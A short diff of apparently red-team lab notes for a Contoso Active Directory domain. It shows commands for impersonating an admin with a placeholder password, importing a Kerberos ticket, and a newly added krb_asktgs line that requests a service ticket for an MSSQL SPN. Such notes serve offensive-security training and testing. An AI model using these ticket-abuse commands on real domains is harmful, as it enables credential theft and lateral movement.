@@ -13,3 +13,9 @@ make_token CONTOSO\admin FakePass
 ```
 kerberos_ticket_use C:\Users\Attacker\Desktop\admin.kirbi
 ```
+
+WE CAN ASK TGS TOO.
+
+```
+krb_asktgs /service:MSSQLSvc/lon-db-1.contoso.com:1433 /ticket:[TICKET]
+```
